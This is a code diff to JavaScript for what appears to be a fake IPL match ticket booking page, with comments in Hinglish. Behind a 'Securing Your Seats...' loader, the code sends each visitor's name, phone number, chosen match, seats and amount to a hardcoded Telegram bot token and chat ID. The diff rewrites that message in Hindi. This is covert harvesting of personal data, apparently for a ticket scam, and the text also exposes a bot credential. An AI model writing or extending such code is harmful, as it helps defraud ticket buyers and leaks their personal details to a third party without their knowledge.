@@ -64,6 +64,9 @@ document.addEventListener("DOMContentLoaded", async () => {
         localStorage.setItem("selectedTotalPrice", total);
         localStorage.setItem("selectedSeatType", window.sType);
         localStorage.setItem("seatQuantity", window.sQty);
+        
+        // Seat details ko combine karke ek local storage me daal dete hain taaki aage ke pages me kaam aaye
+        localStorage.setItem("selectedSeats", `${window.sQty} x ${window.sType}`);
     }
 
     // 5. 🔥 THE ULTIMATE REDIRECT FUNCTION 🔥
@@ -83,23 +86,32 @@ document.addEventListener("DOMContentLoaded", async () => {
                 <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
                     <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
                     <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
-                    <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to gateway</p>
+                    <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting...</p>
                     <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                 </div>
             `;
             document.body.appendChild(loader);
 
-            // 3. Telegram Data
-            const name = localStorage.getItem('customerName') || "Unknown";
-            const phone = localStorage.getItem('customerPhone') || "Unknown";
-            let matchTitle = "IPL Match";
+            // 3. Telegram Data (🔥 YAHAN HINDI MEIN KIYA HAI 🔥)
+            const name = localStorage.getItem('customerName') || "Not Provided";
+            const phone = localStorage.getItem('customerPhone') || "Not Provided";
+            let matchTitle = "Not Selected";
             if (matchTitleEl && matchTitleEl.innerText) matchTitle = matchTitleEl.innerText;
             const totalAmt = window.sQty * window.sPrice;
+            const seatsInfo = `${window.sQty} x ${window.sType}`;
 
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513"; 
-            const telegramMsg = `💰 LEAD REACHED SEAT ADRESS PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${window.sType}\n💵 Total Amount: ₹${totalAmt}`;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
+            
+            const telegramMsg = `🪑 *कस्टमर ने सीट्स सेलेक्ट कर ली हैं! (Seats Page)* 🪑\n\n` +
+                                `👤 *नाम (Name):* ${name}\n` +
+                                `📞 *नंबर (Phone):* ${phone}\n` +
+                                `🏏 *मैच (Match):* ${matchTitle}\n` +
+                                `🎟️ *सीट्स (Seats):* ${seatsInfo}\n` +
+                                `💰 *प्राइस (Price):* ₹${totalAmt}\n\n` +
+                                `👉 *स्टेटस:* अब कस्टमर अगले पेज पर जा रहा है!`;
+                                
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
 
             // 4. BHEJO AUR WAIT KARO
             fetch(url).then(() => {
